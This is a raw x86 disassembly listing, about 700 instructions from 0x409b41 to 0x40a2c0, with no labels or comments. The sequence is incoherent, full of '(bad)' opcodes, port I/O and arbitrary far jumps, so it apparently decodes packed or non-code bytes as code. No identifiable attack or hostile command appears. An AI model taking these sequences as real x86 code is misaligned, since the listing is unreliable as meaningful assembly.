  409b41:	push   es
  409b42:	xlat   BYTE PTR ds:[ebx]
  409b43:	sahf   
  409b44:	neg    edi
  409b46:	repz mov ebp,0x1c6817b5
  409b4c:	mov    ebp,0x55dfc7dd
  409b51:	and    ebx,DWORD PTR [eax]
  409b53:	retf   
  409b54:	outs   dx,BYTE PTR ds:[esi]
  409b55:	jle    0x409b55
  409b57:	pop    eax
  409b58:	lahf   
  409b59:	arpl   WORD PTR [edx+0x3f9edf7b],si
  409b5f:	das    
  409b60:	rcr    BYTE PTR [edi+edi*1-0x18],1
  409b64:	xchg   ebp,eax
  409b65:	xor    ecx,edx
  409b67:	add    BYTE PTR [esp+edi*1],0x53
  409b6b:	mov    eax,ds:0xcd98c0f7
  409b70:	mov    dh,0x43
  409b72:	das    
  409b73:	pop    eax
  409b74:	push   ds
  409b75:	sbb    dl,BYTE PTR [ebx*8-0x5c12092d]
  409b7c:	popf   
  409b7d:	outs   dx,BYTE PTR ds:[esi]
  409b7e:	dec    ebp
  409b7f:	(bad)  [eax+0x104248e0]
  409b85:	js     0x409b91
  409b87:	rcl    BYTE PTR [ebp+0x73],cl
  409b8a:	popf   
  409b8b:	pop    es
  409b8c:	icebp  
  409b8d:	ins    DWORD PTR es:[edi],dx
  409b8e:	enter  0x7793,0x89
  409b92:	pusha  
  409b93:	mov    dl,BYTE PTR [eax]
  409b95:	inc    esp
  409b96:	dec    ecx
  409b97:	lods   eax,DWORD PTR ds:[esi]
  409b98:	dec    BYTE PTR [ecx-0x45ef77a7]
  409b9e:	push   eax
  409b9f:	data16 ds jo 0x409b9c
  409ba3:	pop    ds
  409ba4:	push   esp
  409ba5:	sub    eax,0xc943152
  409baa:	add    DWORD PTR [edi+0xcb3f55],eax
  409bb0:	popa   
  409bb1:	xchg   ecx,eax
  409bb2:	mov    cl,al
  409bb4:	xchg   edi,eax
  409bb5:	pop    es
  409bb6:	xchg   esp,eax
  409bb7:	fdivr  st,st(0)
  409bb9:	inc    ebp
  409bba:	dec    edx
  409bbb:	inc    DWORD PTR [edi+0xd]
  409bbe:	pop    eax
  409bbf:	(bad)  
  409bc1:	push   ss
  409bc2:	add    al,0x41
  409bc4:	dec    ebp
  409bc5:	jbe    0x409b73
  409bc7:	and    bh,BYTE PTR [esi+0x62]
  409bca:	push   esi
  409bcb:	push   edx
  409bcc:	mov    edx,DWORD PTR [eax+ebx*4]
  409bcf:	push   ebx
  409bd0:	in     al,dx
  409bd1:	and    DWORD PTR [esp+edx*1+0x1421a128],ebx
  409bd8:	sbb    DWORD PTR [edi],edi
  409bda:	push   ebp
  409bdb:	stc    
  409bdc:	jb     0x409c40
  409bde:	test   eax,esp
  409be0:	xor    dl,BYTE PTR [ecx]
  409be2:	sub    edx,DWORD PTR [edi]
  409be4:	mov    cl,0x87
  409be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409be8:	sti    
  409be9:	aas    
  409bea:	xchg   DWORD PTR [ecx],esi
  409bec:	mov    bl,0xed
  409bee:	adc    DWORD PTR [ebx-0x5aaeee8d],0xd3a221d3
  409bf8:	jo     0x409c5c
  409bfa:	push   eax
  409bfb:	nop
  409bfc:	pop    ebp
  409bfd:	lods   eax,DWORD PTR ds:[esi]
  409bfe:	xchg   edx,eax
  409bff:	pop    eax
  409c00:	sahf   
  409c01:	push   0xf38ba3d3
  409c06:	mov    bl,BYTE PTR [eax-0x3e]
  409c09:	test   dh,0x31
  409c0c:	sub    bh,BYTE PTR [edi+0x25dccb3f]
  409c12:	inc    ecx
  409c13:	lea    esi,ds:0xf7fb097c
  409c19:	lods   al,BYTE PTR ds:[esi]
  409c1a:	jmp    0xd3c2a992
  409c1f:	dec    esi
  409c20:	in     al,0xb6
  409c22:	outs   dx,BYTE PTR ds:[esi]
  409c23:	test   DWORD PTR [edx],ecx
  409c25:	lock mov edi,0x292121f0
  409c2b:	pop    ss
  409c2c:	or     eax,DWORD PTR [eax-0x22]
  409c2f:	dec    esp
  409c30:	cmp    dl,ah
  409c32:	cmp    bh,BYTE PTR [eax-0x6f]
  409c35:	push   es
  409c36:	jg     0x409ca6
  409c38:	mov    gs,WORD PTR [edx-0x4158d264]
  409c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c3f:	mov    al,ds:0xcc6476d0
  409c44:	xchg   esi,eax
  409c45:	neg    edx
  409c47:	sahf   
  409c48:	push   0x3b
  409c4a:	add    ebp,edi
  409c4c:	adc    cl,BYTE PTR [edi-0x4fd6612b]
  409c52:	sub    ecx,ebp
  409c54:	mov    ecx,0x9cc007ef
  409c59:	les    eax,FWORD PTR [edi-0x37]
  409c5c:	stos   BYTE PTR es:[edi],al
  409c5d:	xchg   edx,eax
  409c5e:	jb     0x409cd4
  409c60:	sub    edx,DWORD PTR [esi-0x1d]
  409c63:	pushf  
  409c64:	test   DWORD PTR [ecx-0x3d0f9c64],edx
  409c6a:	jecxz  0x409bf8
  409c6c:	mov    edx,0xe897c458
  409c71:	and    al,0x5b
  409c73:	cwde   
  409c74:	push   es
  409c75:	fs inc esp
  409c77:	inc    esp
  409c78:	adc    DWORD PTR [esi+0x6a],eax
  409c7b:	or     DWORD PTR [eax-0x3e],ecx
  409c7e:	js     0x409c59
  409c80:	mov    al,ds:0x4b120308
  409c85:	inc    esp
  409c86:	dec    eax
  409c87:	jge    0x409c2c
  409c89:	xor    bh,BYTE PTR [eax]
  409c8b:	mov    ebx,DWORD PTR [edi]
  409c8d:	or     BYTE PTR [ecx+0x5e71d78e],ch
  409c93:	mov    ebx,0xa3cedd6d
  409c98:	inc    edi
  409c99:	loop   0x409ca3
  409c9b:	mov    bl,0x15
  409c9d:	dec    ecx
  409c9e:	cwde   
  409c9f:	mov    bh,0x8
  409ca1:	jb     0x409c4b
  409ca3:	push   ebx
  409ca4:	cli    
  409ca5:	pushf  
  409ca6:	int    0xd6
  409ca8:	or     BYTE PTR [edx-0x9],0xb6
  409cac:	and    eax,0xf7c65bc2
  409cb1:	into   
  409cb2:	mov    ah,0xd
  409cb4:	jae    0x409c5e
  409cb6:	call   0xcb1ce854
  409cbb:	sbb    dl,BYTE PTR [ecx+0x1]
  409cbe:	mov    edi,DWORD PTR [ebx-0x5b8e3931]
  409cc4:	mov    ch,0x7f
  409cc6:	es in  al,dx
  409cc8:	pusha  
  409cc9:	in     eax,0xd0
  409ccb:	lods   eax,DWORD PTR ds:[esi]
  409ccc:	mov    eax,ds:0x470014a
  409cd1:	jl     0x409c72
  409cd3:	rcl    BYTE PTR [esi],0x95
  409cd6:	mov    dh,0xfc
  409cd8:	pop    edi
  409cd9:	call   0xbdb57441
  409cde:	inc    edx
  409cdf:	les    edx,FWORD PTR [edi]
  409ce1:	int    0x1c
  409ce3:	mov    BYTE PTR [esi],0xaa
  409ce6:	xor    al,0x29
  409ce8:	cmp    DWORD PTR [ebx+0x5f],eax
  409ceb:	push   edx
  409cec:	jb     0x409d30
  409cee:	test   BYTE PTR [eax-0x6c39a038],0x3d
  409cf5:	add    eax,0xce153265
  409cfa:	ret    
  409cfb:	jmp    0x409cb9
  409cfd:	mov    ebp,0x1f4384af
  409d02:	addr16 std 
  409d04:	dec    eax
  409d05:	sbb    BYTE PTR [ebx+0x5a2a622d],bl
  409d0b:	mov    ecx,0xbda4d65d
  409d10:	retf   
  409d11:	or     eax,DWORD PTR [ebp-0x5fea17c4]
  409d17:	adc    al,0x33
  409d19:	int3   
  409d1a:	ret    
  409d1b:	dec    esi
  409d1c:	outs   dx,BYTE PTR ds:[esi]
  409d1d:	test   bl,ch
  409d1f:	adc    DWORD PTR [esi+0x7d],esp
  409d22:	xor    al,0x16
  409d24:	push   edx
  409d25:	scas   eax,DWORD PTR es:[edi]
  409d26:	sub    DWORD PTR [edx+0x167c0db4],0xb2eb6730
  409d30:	adc    al,0x42
  409d32:	dec    ebp
  409d33:	xchg   BYTE PTR [edx+0x0],bh
  409d36:	dec    eax
  409d37:	pop    ebx
  409d38:	ja     0x409d42
  409d3a:	xor    al,0x9f
  409d3c:	das    
  409d3d:	lds    ecx,FWORD PTR [ebx-0x79fbe858]
  409d43:	ret    0xa982
  409d46:	sbb    al,0xe2
  409d48:	jp     0x409d9d
  409d4a:	inc    ebx
  409d4b:	xor    ah,BYTE PTR [edi]
  409d4d:	or     al,BYTE PTR [eax+0x40e5866f]
  409d53:	xor    DWORD PTR [ebp+0x7f69aca6],esi
  409d59:	adc    al,0xb4
  409d5b:	inc    edx
  409d5c:	cmc    
  409d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d5e:	sti    
  409d5f:	daa    
  409d60:	fucomi st,st(2)
  409d62:	ds lahf 
  409d64:	mov    WORD PTR [ebx+0x594ee5cc],cs
  409d6a:	sbb    eax,DWORD PTR [ebx+0x2d]
  409d6d:	xchg   BYTE PTR [esi+0x52c04aaf],bl
  409d73:	pop    edi
  409d74:	mov    BYTE PTR [edi+0x7447beb1],0x51
  409d7b:	cmc    
  409d7c:	loop   0x409d87
  409d7e:	cmc    
  409d7f:	cmp    eax,0x6ba02443
  409d84:	fisub  DWORD PTR [ecx-0x108834b6]
  409d8a:	fidivr WORD PTR [edx+0x3a]
  409d8d:	pusha  
  409d8e:	(bad)  
  409d8f:	cmp    eax,0x2a74df61
  409d94:	pop    edi
  409d95:	and    eax,0x6fdbfa16
  409d9a:	pop    edi
  409d9b:	hlt    
  409d9c:	mov    ebx,0x3bfe21dd
  409da1:	imul   ecx,DWORD PTR [eax],0x42
  409da4:	fisttp QWORD PTR [edx-0x48]
  409da7:	mov    DWORD PTR [edi],esi
  409da9:	scas   eax,DWORD PTR es:[edi]
  409daa:	jp     0x409dc5
  409dac:	jmp    0x44b8:0x50ae2325
  409db3:	(bad)  
  409db4:	out    0xde,al
  409db6:	xor    al,0xaf
  409db8:	push   0xd69f6d13
  409dbd:	pop    edi
  409dbe:	loope  0x409d69
  409dc0:	hlt    
  409dc1:	sbb    dl,bl
  409dc3:	stos   BYTE PTR es:[edi],al
  409dc4:	fwait
  409dc5:	push   edi
  409dc6:	arpl   WORD PTR [ecx+0x3779fa4c],bp
  409dcc:	popa   
  409dcd:	add    al,0xc2
  409dcf:	xchg   ebp,eax
  409dd0:	push   edi
  409dd1:	pushf  
  409dd2:	arpl   WORD PTR [esi-0x72],di
  409dd5:	lods   eax,DWORD PTR ds:[esi]
  409dd6:	add    al,0xa5
  409dd8:	mov    dh,bl
  409dda:	mov    ds:0x56a72e5,al
  409ddf:	or     al,0xa3
  409de1:	and    eax,0xa27655c2
  409de6:	or     edi,esp
  409de8:	aam    0x78
  409dea:	nop
  409deb:	(bad)  
  409dec:	jae    0x409e18
  409dee:	rol    cl,cl
  409df0:	fscale 
  409df2:	out    0x68,eax
  409df4:	adc    al,0x6a
  409df6:	add    DWORD PTR [edx],ebx
  409df8:	xchg   edx,eax
  409df9:	push   ds
  409dfa:	aaa    
  409dfb:	adc    al,0xcc
  409dfd:	mov    BYTE PTR [ecx+0x5a],ch
  409e00:	jge    0x409e35
  409e02:	and    ch,cl
  409e04:	pusha  
  409e05:	lods   al,BYTE PTR ds:[esi]
  409e06:	lea    edi,[edx-0x3b1cc5ce]
  409e0c:	cs push ebx
  409e0e:	into   
  409e0f:	ja     0x409df6
  409e11:	shr    DWORD PTR [eax-0x6b5b566e],cl
  409e17:	test   al,0x19
  409e19:	jle    0x409e15
  409e1b:	fwait
  409e1c:	lock mov eax,0x46e39e3
  409e22:	xchg   esi,eax
  409e23:	and    BYTE PTR [ecx],ah
  409e25:	push   ebx
  409e26:	and    eax,0xde932759
  409e2b:	test   eax,0xd238f7c3
  409e30:	stos   BYTE PTR es:[edi],al
  409e31:	dec    esi
  409e32:	scas   al,BYTE PTR es:[edi]
  409e33:	pop    edx
  409e34:	xchg   ebx,eax
  409e35:	imul   esi,DWORD PTR [ecx+0x6951fbac],0x70
  409e3c:	stos   BYTE PTR es:[edi],al
  409e3d:	push   cs
  409e3e:	jbe    0x409e5e
  409e40:	es sbb ch,bl
  409e43:	(bad)  
  409e44:	jne    0x409e48
  409e46:	add    dh,dh
  409e48:	push   ss
  409e49:	mov    dh,0xf8
  409e4b:	ins    DWORD PTR es:[edi],dx
  409e4c:	sbb    ebp,DWORD PTR [ebp-0x70ceb2f7]
  409e52:	xchg   edx,eax
  409e53:	mov    ch,0x44
  409e55:	xchg   esi,eax
  409e56:	jmp    0x38dc7b8c
  409e5b:	sar    DWORD PTR [ecx+0x40],0x53
  409e5f:	fstp   QWORD PTR [ebp-0x22]
  409e62:	adc    BYTE PTR [ecx+0x3741485d],0x4b
  409e69:	ret    0x2eff
  409e6c:	into   
  409e6d:	jno    0x409ee0
  409e6f:	mov    DWORD PTR [esi-0x1e0cfb09],0xe439aab
  409e79:	call   0x2278:0x9af0edad
  409e80:	repz ds jo 0x409eed
  409e84:	stos   BYTE PTR es:[edi],al
  409e85:	dec    ebx
  409e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e88:	je     0x409e60
  409e8a:	rcr    DWORD PTR [esi-0x7df1f6cd],1
  409e90:	daa    
  409e91:	inc    esi
  409e92:	(bad)  
  409e93:	fimul  WORD PTR [eax-0x1d90877]
  409e99:	mov    esi,0xdb846d9b
  409e9e:	sbb    BYTE PTR ds:0x4663a551,ah
  409ea4:	or     ebx,edx
  409ea6:	fdivr  st,st(3)
  409ea8:	add    DWORD PTR [ebx+0x72],edi
  409eab:	push   ebp
  409eac:	sbb    eax,0x6eb6c95
  409eb1:	xor    eax,0xb07a314a
  409eb6:	push   ecx
  409eb7:	sbb    eax,0xad0cedf8
  409ebc:	jg     0x409e63
  409ebe:	and    esp,DWORD PTR [eax+0x7bbf1697]
  409ec4:	lds    ecx,FWORD PTR [ecx+0x47]
  409ec7:	out    0x5b,al
  409ec9:	pop    ebx
  409eca:	fcomp  DWORD PTR [esi+ebp*1]
  409ecd:	mov    ecx,0x7e08f440
  409ed2:	add    ebp,DWORD PTR [ecx+eiz*8]
  409ed5:	ins    BYTE PTR es:[edi],dx
  409ed6:	sub    DWORD PTR [esi-0x30],edi
  409ed9:	les    ebp,FWORD PTR ds:[esi+0x4f4e7763]
  409ee0:	hlt    
  409ee1:	mov    ebp,0x635c831
  409ee6:	ins    BYTE PTR es:[edi],dx
  409ee7:	cmc    
  409ee8:	sub    edi,eax
  409eea:	test   BYTE PTR [ecx+0x6c062ade],bh
  409ef0:	jecxz  0x409ee7
  409ef2:	push   esi
  409ef3:	scas   eax,DWORD PTR es:[edi]
  409ef4:	xchg   BYTE PTR [ebp+0x39],cl
  409ef7:	push   cs
  409ef8:	test   DWORD PTR [esi],edi
  409efa:	xor    BYTE PTR ds:[edi+0x171f33c9],0x9a
  409f02:	sub    al,0xc4
  409f04:	inc    edx
  409f05:	ins    DWORD PTR es:[edi],dx
  409f06:	aaa    
  409f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f08:	fist   WORD PTR [edx]
  409f0a:	paddw  mm5,QWORD PTR [ecx-0x27199d0d]
  409f11:	jmp    0x409eec
  409f13:	stos   DWORD PTR es:[edi],eax
  409f14:	arpl   WORD PTR [esp+ebp*8+0x26cd9da9],si
  409f1b:	mov    dl,0x97
  409f1d:	push   0x4d33cb95
  409f22:	enter  0x9c99,0x2c
  409f26:	fisttp DWORD PTR [ebx]
  409f28:	and    al,0xd8
  409f2a:	jmp    0x5ffd:0xd5931254
  409f31:	out    dx,al
  409f32:	xor    bh,BYTE PTR [edx-0xeb86296]
  409f38:	and    eax,0x71b2912d
  409f3d:	dec    edx
  409f3e:	hlt    
  409f3f:	push   esp
  409f40:	ins    BYTE PTR es:[edi],dx
  409f41:	inc    ebp
  409f42:	in     al,dx
  409f43:	outs   dx,DWORD PTR ds:[esi]
  409f44:	shl    cl,1
  409f46:	push   ebx
  409f47:	daa    
  409f48:	inc    ecx
  409f49:	sub    al,0x8b
  409f4b:	adc    eax,edx
  409f4d:	lds    esp,FWORD PTR [eax]
  409f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f50:	sub    BYTE PTR [ebp+edi*2+0x2c],0x21
  409f55:	push   0x7a9a37eb
  409f5a:	jge    0x409fba
  409f5c:	fstp   TBYTE PTR [edx-0x12]
  409f5f:	lea    ebx,[ebx]
  409f61:	jge    0x409f1e
  409f63:	cmp    edx,DWORD PTR [bx+di]
  409f66:	xor    eax,DWORD PTR [edx-0x69]
  409f69:	mov    BYTE PTR [ebp-0x68],al
  409f6c:	nop
  409f6d:	inc    esp
  409f6e:	fnstcw WORD PTR [edx+edx*8-0x6f]
  409f72:	mov    al,ds:0xee08f72c
  409f77:	sbb    dl,BYTE PTR [ecx]
  409f79:	xor    edx,DWORD PTR [edx-0x23955f37]
  409f7f:	sbb    eax,0xd0befd71
  409f85:	add    eax,esp
  409f87:	adc    DWORD PTR [edx-0x68c63894],edi
  409f8d:	std    
  409f8e:	icebp  
  409f8f:	fbstp  TBYTE PTR [eax+0x65]
  409f92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f93:	add    BYTE PTR [ebx],cl
  409f95:	and    al,0x30
  409f97:	inc    edx
  409f98:	lahf   
  409f99:	dec    ebp
  409f9a:	pop    eax
  409f9b:	js     0x409f58
  409f9d:	sbb    edx,DWORD PTR [ebp+0xf9f4da1]
  409fa3:	stos   BYTE PTR es:[edi],al
  409fa4:	lods   eax,DWORD PTR ds:[esi]
  409fa5:	repz mov ah,0xc3
  409fa8:	or     BYTE PTR fs:[ecx-0x4d],bh
  409fac:	pusha  
  409fad:	ins    DWORD PTR es:[edi],dx
  409fae:	xchg   esp,eax
  409faf:	pop    eax
  409fb0:	popf   
  409fb1:	adc    al,0x3f
  409fb3:	idiv   BYTE PTR [edi]
  409fb5:	fimul  WORD PTR [esi-0x5058718b]
  409fbb:	sahf   
  409fbc:	add    DWORD PTR [esp+ebx*8],0x6d41a711
  409fc3:	push   es
  409fc4:	fisttp WORD PTR [edi]
  409fc6:	mov    al,ds:0xd229d492
  409fcb:	aad    0xcc
  409fcd:	jb     0x409ff5
  409fcf:	mov    dl,0xac
  409fd1:	das    
  409fd2:	loopne 0x409fcd
  409fd4:	shr    DWORD PTR [eax+0x19],1
  409fd7:	mov    eax,ds:0x8da56217
  409fdc:	pop    ss
  409fdd:	scas   al,BYTE PTR es:[edi]
  409fde:	sub    edx,esp
  409fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe1:	loope  0x409fd1
  409fe3:	mov    ds:0x4450b412,al
  409fe8:	lahf   
  409fe9:	mov    bl,0x93
  409feb:	sub    BYTE PTR [esi-0x39],bh
  409fee:	xor    eax,0xc2a3ea46
  409ff3:	retf   
  409ff4:	lods   al,BYTE PTR ds:[esi]
  409ff5:	mov    bl,0x8d
  409ff7:	cwde   
  409ff8:	cdq    
  409ff9:	dec    esp
  409ffa:	mov    al,ds:0xab148c43
  409fff:	loop   0x40a029
  40a001:	in     al,dx
  40a002:	gs mov ecx,cs
  40a005:	or     edx,DWORD PTR [ecx]
  40a007:	mov    ebp,0x895c6f35
  40a00c:	sub    al,0xce
  40a00e:	fwait
  40a00f:	aaa    
  40a010:	test   al,0xc4
  40a012:	gs pop ebx
  40a014:	loope  0x40a075
  40a016:	pop    es
  40a017:	fild   QWORD PTR [ebp+0x27e84cb4]
  40a01d:	scas   al,BYTE PTR es:[edi]
  40a01e:	push   ebp
  40a01f:	xchg   edx,eax
  40a020:	test   DWORD PTR [ecx-0x577cef18],esp
  40a026:	xchg   esp,eax
  40a027:	mov    al,0xb1
  40a029:	mov    ds:0xca639d35,eax
  40a02e:	mov    esi,0xbeb859b5
  40a033:	mov    ah,0x10
  40a035:	mov    ch,0x57
  40a037:	sub    BYTE PTR [edx-0x28d22d4],ah
  40a03d:	jnp    0x40a08f
  40a03f:	jns    0x409fdc
  40a041:	jp     0x40a097
  40a043:	mov    esi,0x93d6be17
  40a048:	repz inc dx
  40a04b:	stc    
  40a04c:	or     DWORD PTR [edi+0x7],ebx
  40a04f:	clc    
  40a050:	dec    ebp
  40a051:	lock out 0xef,al
  40a054:	loop   0x40a0c6
  40a056:	int3   
  40a057:	bound  esp,QWORD PTR [esi+0x62]
  40a05a:	push   ecx
  40a05b:	dec    esi
  40a05c:	cld    
  40a05d:	xor    BYTE PTR [edx],bh
  40a05f:	out    dx,al
  40a060:	mov    ds:0x2f84c1eb,eax
  40a065:	cld    
  40a066:	inc    BYTE PTR [ecx-0x678d5b31]
  40a06c:	mov    es,WORD PTR [ebp-0x4b567af4]
  40a072:	shl    edx,0x96
  40a075:	add    DWORD PTR [edi+0x1ec3790d],esi
  40a07b:	add    eax,DWORD PTR [edi-0x23]
  40a07e:	push   esp
  40a07f:	clc    
  40a080:	sub    DWORD PTR [esi+0x23],ebp
  40a083:	mov    eax,0x39755c5e
  40a088:	push   ebp
  40a089:	mov    eax,ds:0x8bae1a3e
  40a08e:	jl     0x40a042
  40a090:	outs   dx,BYTE PTR ds:[esi]
  40a091:	loopne 0x40a071
  40a093:	mov    WORD PTR [esi-0x388a87a1],gs
  40a099:	xor    BYTE PTR [esi+0x1ba73b55],bh
  40a09f:	or     bh,BYTE PTR [ecx-0x41658961]
  40a0a5:	jg     0x40a051
  40a0a7:	jmp    0x55ee:0x247ac31c
  40a0ae:	and    DWORD PTR [edi],0x7d74fd5d
  40a0b4:	icebp  
  40a0b5:	or     cl,ch
  40a0b7:	lahf   
  40a0b8:	addr16 adc al,0xe9
  40a0bb:	and    dh,bh
  40a0bd:	out    0xfa,eax
  40a0bf:	mov    ecx,0x737343c1
  40a0c4:	mov    ecx,0x407b7ee0
  40a0c9:	push   ebp
  40a0ca:	ret    
  40a0cb:	adc    eax,0xd73b1278
  40a0d0:	jle    0x40a065
  40a0d2:	cld    
  40a0d3:	or     DWORD PTR [edx],ebx
  40a0d5:	ins    BYTE PTR es:[edi],dx
  40a0d6:	in     al,dx
  40a0d7:	pop    ebp
  40a0d8:	shr    BYTE PTR [eax],1
  40a0da:	hlt    
  40a0db:	xor    edx,esi
  40a0dd:	mov    al,ds:0x7b234c6d
  40a0e2:	into   
  40a0e3:	cmp    eax,0xb8e71dec
  40a0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0e9:	jecxz  0x40a101
  40a0eb:	push   cs
  40a0ec:	arpl   WORD PTR [edi+0x7e892237],sp
  40a0f2:	ret    0xa5d9
  40a0f5:	jl     0x40a122
  40a0f7:	mov    bl,0xee
  40a0f9:	mov    dh,0x51
  40a0fb:	repnz mov eax,0x659783fc
  40a101:	xchg   edi,eax
  40a102:	test   DWORD PTR [ebp+0x5db7d3f6],ebx
  40a108:	jg     0x40a0fe
  40a10a:	into   
  40a10b:	or     eax,0x8abb6c5e
  40a110:	hlt    
  40a111:	(bad)  
  40a113:	mov    ecx,ecx
  40a115:	push   eax
  40a116:	pushf  
  40a117:	inc    ebp
  40a118:	mov    ecx,ds
  40a11a:	pop    edx
  40a11b:	mov    bl,0x3
  40a11d:	dec    ecx
  40a11e:	jmp    0x40a16b
  40a120:	mov    ebx,0x6e49e3db
  40a125:	sub    DWORD PTR ds:0x7891482e,ebp
  40a12b:	push   edx
  40a12c:	fldenv [edx-0x3a]
  40a12f:	xchg   edx,eax
  40a130:	jne    0x40a188
  40a132:	in     al,0xbb
  40a134:	outs   dx,BYTE PTR ds:[esi]
  40a135:	sbb    eax,0xa8850833
  40a13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a13b:	hlt    
  40a13c:	(bad)  
  40a13d:	pop    edx
  40a13e:	mov    WORD PTR gs:[edx+0x47],ss
  40a142:	test   BYTE PTR [edi+0x61],dl
  40a145:	dec    ebx
  40a146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a147:	pop    edx
  40a148:	xchg   esp,eax
  40a149:	in     eax,0x3f
  40a14b:	pop    ss
  40a14c:	mov    ebx,eax
  40a14e:	dec    edx
  40a14f:	aam    0xb7
  40a151:	addr16 loop 0x40a11f
  40a154:	mov    ds:0xb9aad083,eax
  40a159:	jmp    0x7da0:0x5abd4266
  40a160:	sbb    eax,0xe80cf00f
  40a165:	arpl   bx,sp
  40a167:	cld    
  40a168:	out    0xf1,eax
  40a16a:	sahf   
  40a16b:	fmul   QWORD PTR [eax]
  40a16d:	cmp    DWORD PTR [edi-0x4ebd856d],edi
  40a173:	lds    ebp,FWORD PTR ds:0xc0492bd1
  40a179:	ja     0x40a164
  40a17b:	sar    BYTE PTR [ebx+esi*2+0x0],1
  40a17f:	pop    ds
  40a180:	jmp    0x40a1a7
  40a182:	cwde   
  40a183:	cmp    eax,0x5aeee3a9
  40a188:	adc    BYTE PTR [esi],dl
  40a18a:	in     eax,0x21
  40a18c:	pop    ds
  40a18d:	mov    DWORD PTR [eax+0x66],eax
  40a190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a191:	in     eax,0xb7
  40a193:	or     DWORD PTR [ecx],edx
  40a195:	test   DWORD PTR [eax-0x44],0x8f321343
  40a19c:	and    DWORD PTR [eax+0x62779248],ebp
  40a1a2:	push   ss
  40a1a3:	xchg   edi,eax
  40a1a4:	sub    dl,dh
  40a1a6:	aad    0x32
  40a1a8:	sbb    BYTE PTR [edi-0x1bea5112],dl
  40a1ae:	inc    cl
  40a1b0:	ins    DWORD PTR es:[edi],dx
  40a1b1:	push   ss
  40a1b2:	(bad)  
  40a1b4:	inc    esi
  40a1b5:	push   cs
  40a1b6:	inc    esp
  40a1b7:	jo     0x40a1c9
  40a1b9:	mov    ds:0x575af28a,ax
  40a1bf:	pop    ebp
  40a1c0:	ror    BYTE PTR [edi+0x4b],cl
  40a1c3:	jle    0x40a172
  40a1c5:	cmp    ecx,DWORD PTR [eax]
  40a1c7:	hlt    
  40a1c8:	pop    edi
  40a1c9:	mov    cl,0x8e
  40a1cb:	xchg   ebp,eax
  40a1cc:	out    0xc2,eax
  40a1ce:	sar    BYTE PTR [esi+ebx*1-0x4e1f29d1],cl
  40a1d5:	pusha  
  40a1d6:	out    0x22,eax
  40a1d8:	call   0x9d31:0xfd4fb268
  40a1df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1e0:	jp     0x40a185
  40a1e2:	out    dx,eax
  40a1e3:	xchg   ebp,eax
  40a1e4:	cs stos DWORD PTR es:[edi],eax
  40a1e6:	shl    BYTE PTR [ebx-0x17],1
  40a1e9:	jnp    0x40a250
  40a1eb:	xor    BYTE PTR [esi-0x301bd90c],0x38
  40a1f2:	out    dx,al
  40a1f3:	shr    DWORD PTR [edx],1
  40a1f5:	push   ebp
  40a1f6:	daa    
  40a1f7:	test   BYTE PTR [ebp-0x5d],cl
  40a1fa:	xchg   edi,eax
  40a1fb:	add    BYTE PTR [edi],0x85
  40a1fe:	xchg   ebx,eax
  40a1ff:	mov    ebp,0x6519a533
  40a204:	xor    al,0xf8
  40a206:	mov    WORD PTR [ecx+0x37],?
  40a209:	xor    bh,BYTE PTR [ebp-0x37]
  40a20c:	mov    edx,0xba4b4868
  40a211:	test   BYTE PTR [esi+0x1d],dh
  40a214:	retf   0xa095
  40a217:	adc    BYTE PTR [edx-0x4ee1bc42],cl
  40a21d:	bswap  edi
  40a21f:	ret    
  40a220:	daa    
  40a221:	cmp    DWORD PTR [ebp+0x8],eax
  40a224:	(bad)  
  40a225:	dec    edx
  40a226:	pop    esp
  40a227:	mov    bl,0x26
  40a229:	pop    ecx
  40a22a:	enter  0x9174,0x89
  40a22e:	fisub  WORD PTR [ebx+0x34a7b717]
  40a234:	(bad)  
  40a235:	mov    esi,0x5e057849
  40a23a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a23b:	test   DWORD PTR [esi+0x76],0x904060d8
  40a242:	pmaxsw mm1,QWORD PTR [ebp+0x29]
  40a246:	jns    0x40a28c
  40a248:	popf   
  40a249:	adc    BYTE PTR [ebx-0x7863b08c],bh
  40a24f:	pop    es
  40a250:	push   ebx
  40a251:	cwde   
  40a252:	outs   dx,DWORD PTR ds:[esi]
  40a253:	xor    al,0x5
  40a255:	(bad)  
  40a256:	jmp    0xa4d81efc
  40a25b:	retf   
  40a25c:	out    dx,al
  40a25d:	mov    ah,0xde
  40a25f:	pop    eax
  40a260:	mov    ds:0x4b0de13,eax
  40a265:	lods   al,BYTE PTR ds:[esi]
  40a266:	mov    bh,0x4f
  40a268:	(bad)
  40a26b:	cmp    BYTE PTR [ebp+edi*2+0x276d7ae3],0x6d
  40a273:	dec    esi
  40a274:	imul   edx,esi,0x60
  40a277:	xlat   BYTE PTR ds:[ebx]
  40a278:	mov    ds:0x77fc0f10,al
  40a27d:	xchg   esp,eax
  40a27e:	loop   0x40a2c2
  40a280:	mov    edx,edi
  40a282:	pusha  
  40a283:	sub    esi,eax
  40a285:	sahf   
  40a286:	push   ecx
  40a287:	aad    0x1a
  40a289:	push   ecx
  40a28a:	lock inc esp
  40a28c:	adc    eax,0xa35fd2cb
  40a291:	and    DWORD PTR [eax-0x37],ecx
  40a294:	sbb    bh,cl
  40a296:	push   0x1a
  40a298:	adc    edx,DWORD PTR [ebx+0x13]
  40a29b:	cmp    al,0xdc
  40a29d:	and    bl,BYTE PTR [edi+0x5138b3f8]
  40a2a3:	(bad)  
  40a2a4:	sub    dh,bl
  40a2a6:	add    DWORD PTR [ecx-0x88ed36b],esi
  40a2ac:	sub    al,0xaa
  40a2ae:	popa   
  40a2af:	clc    
  40a2b0:	adc    eax,0xb94b74bf
  40a2b5:	add    eax,0xd6b581b1
  40a2ba:	sub    cl,BYTE PTR [edx+0x2099720]
  40a2c0:	xchg   esi,eax
